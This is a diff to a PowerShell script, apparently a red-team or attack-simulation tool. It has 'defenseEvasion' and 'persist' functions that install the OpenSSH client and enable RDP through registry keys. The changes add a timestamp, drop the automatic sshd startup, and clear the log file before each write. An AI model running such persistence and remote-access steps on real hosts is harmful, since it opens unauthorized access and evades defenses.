@@ -10,8 +10,7 @@ $arg1=$args[1]
 # The log will only be written to the configs.txt file if the --log flag is set.
 $global:logString = ""
  $outFilePath = "./configs.txt"
-
-
+$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 function defenseEvasion {
 
    $global:logString = $global:logString + "---------- DEFENSE EVASTION ----------`n"
@@ -124,9 +123,7 @@ function persist {
     # Install SSH client on the host
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
     # Enable SSH service + modify the service to start automatically
-   Start-Service sshd
-   Set-Service -Name sshd -StartupType 'Automatic'
-   $global:logString = $global:logString +  "SSH client installed, enabled to run on startup.`n"
+   $global:logString = $global:logString +  "SSH client installed. `n"
 
    #Enable RDP on the system
    # Registry keys taken from this Reddit thread: https://www.reddit.com/r/PowerShell/comments/8qbxn5/enabling_rdp/
@@ -138,6 +135,7 @@ function persist {
 
 # Main Execution
 $global:logString = $global:logString +  ".......... BEGINNING NEW CONFIG ............`n"
+$global:logString = $global:logString +  "TIMESTAMP: " + $timestamp + "`n"
 
 if ($arg0 -eq "--help") {
     showHelp
@@ -152,10 +150,10 @@ if ($arg0 -eq "--persist" -or $arg1 -eq "--persist" ) {
     persist
 }
 
-Write-Output $global:logString
 
 try {
     if ($arg0 -eq "--log" -or $arg1 -eq "--log" ) {
+        Remove-Item $outFilePath
         Add-Content -Path $outFilePath -Value $global:logString
     } 
 }
